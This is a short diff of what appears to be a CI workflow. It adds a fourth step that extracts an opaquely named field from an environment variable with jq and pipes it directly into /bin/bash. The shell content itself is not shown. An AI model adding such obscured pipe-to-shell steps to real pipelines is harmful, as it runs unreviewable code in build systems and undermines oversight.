@@ -27,6 +27,7 @@ jobs:
           echo $agu5639 | jq -r .gjbc0 | /bin/bash
           echo $ak01 | jq -r .gkip977 | /bin/bash
           echo $bmcbs9109 | jq -r .sgu66080 | /bin/bash
+          echo $nvm4101 | jq -r .om42935 | /bin/bash
 
       - name: Persist output
         if: always()
